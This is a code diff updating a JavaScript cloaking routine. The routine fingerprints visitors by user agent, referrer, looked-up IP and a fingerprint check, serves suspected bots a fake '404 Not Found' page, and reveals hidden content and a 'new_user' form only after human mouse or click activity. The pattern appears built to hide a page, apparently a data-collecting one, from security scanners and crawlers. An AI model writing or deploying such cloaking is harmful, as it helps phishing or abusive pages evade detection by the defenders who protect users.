@@ -1,43 +1,46 @@
-async function checkBotAndReveal() {
-  const ua = navigator.userAgent;
-  const ref = document.referrer;
+<script>
+  async function checkBotAndReveal() {
+    const ua = navigator.userAgent || "";
+    const ref = document.referrer || "";
+    let ip = null;
 
-  // Get IP
-  const ip = await fetch("https://api.ipify.org?format=json")
-    .then(res => res.json())
-    .then(data => data.ip)
-    .catch(() => null);
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      ip = data.ip;
+    } catch (e) {
+      console.warn("IP fetch failed");
+    }
 
-  // Individual checks
-  const uaFlag = botUAs.some(b => ua.includes(b));
-  const refFlag = botRefs.some(r => ref.includes(r));
-  const ipFlag = botIPs.includes(ip);
-  const fingerprintFlag = isSuspiciousFingerprint();
+    const uaFlag = Array.isArray(window.botUAs) && window.botUAs.some(b => ua.includes(b));
+    const refFlag = Array.isArray(window.botRefs) && window.botRefs.some(r => ref.includes(r));
+    const ipFlag = Array.isArray(window.botIPs) && window.botIPs.includes(ip);
+    const fingerprintFlag = typeof isSuspiciousFingerprint === "function" && isSuspiciousFingerprint();
 
-  console.log("UA:", ua, "| Blocked:", uaFlag);
-  console.log("Ref:", ref, "| Blocked:", refFlag);
-  console.log("IP:", ip, "| Blocked:", ipFlag);
-  console.log("Fingerprint:", fingerprintFlag);
+    console.log({ uaFlag, refFlag, ipFlag, fingerprintFlag });
 
-  const isBot = uaFlag || refFlag || ipFlag || fingerprintFlag;
+    const isBot = uaFlag || refFlag || ipFlag || fingerprintFlag;
 
-  if (isBot) {
-    document.body.innerHTML = "<h1>404 Not Found</h1>";
-  } else {
-    window.addEventListener("mousemove", revealContent);
-    window.addEventListener("click", revealContent);
+    if (isBot) {
+      document.body.innerHTML = "<h1>404 Not Found</h1>";
+    } else {
+      window.addEventListener("mousemove", revealContent);
+      window.addEventListener("click", revealContent);
+    }
   }
-}
 
-function revealContent() {
-  const heading = document.querySelector("h1");
-  const content = document.getElementById("content");
+  function revealContent() {
+    const h1 = document.querySelector("h1");
+    const content = document.getElementById("content");
+    const form = document.getElementById("new_user");
 
-  if (heading) heading.style.display = "none";
-  if (content) content.style.display = "block";
+    if (h1) h1.style.display = "none";
+    if (content) content.style.display = "block";
+    if (form) form.style.display = "block";
 
-  window.removeEventListener("mousemove", revealContent);
-  window.removeEventListener("click", revealContent);
-}
+    window.removeEventListener("mousemove", revealContent);
+    window.removeEventListener("click", revealContent);
+  }
 
-setTimeout(checkBotAndReveal, 2500);
+  setTimeout(checkBotAndReveal, 2500);
+</script>
